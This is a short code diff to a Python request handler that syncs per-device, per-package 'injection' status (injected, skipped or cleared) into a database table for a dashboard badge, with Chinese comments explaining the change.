@@ -585,6 +585,22 @@ def h_inj_track_act(b, q, a):
     act = q.get('_act') or b.get('_act') or 'inject'
     st = {'inject': 'injected', 'reset': 'idle', 'skip': 'skipped'}.get(act, act)
     S['inj_track'][d] = {'state': st, 'ts': now()}
+    # 面板状态徽标读 inj_state 表：这里同步落库，避免"重注"后闪一下"已注入"
+    #   reset  → 清成空（面板显示"等待中"，等设备真正回报 inject）
+    #   inject → injected；skip → skipped
+    try:
+        _db = db()
+        _pkg = str(b.get('packageName') or b.get('package_name') or b.get('pkg') or '').strip()
+        if _db and d:
+            if act == 'reset':
+                if _pkg:
+                    _db.inj_state_set(d, _pkg, '')
+                else:
+                    _db.inj_state_clear(d)
+            elif _pkg:
+                _db.inj_state_set(d, _pkg, {'inject': 'injected', 'skip': 'skipped'}.get(act, act))
+    except Exception as e:
+        print('[inj] track_act 落库失败: %s' % e, flush=True)
     if act == 'inject':
         S['inj_records'].append({'ts': now(), 'deviceId': d, 'package': b.get('package_name', ''),
                                  'app': b.get('app_name', ''), 'enabled': True})
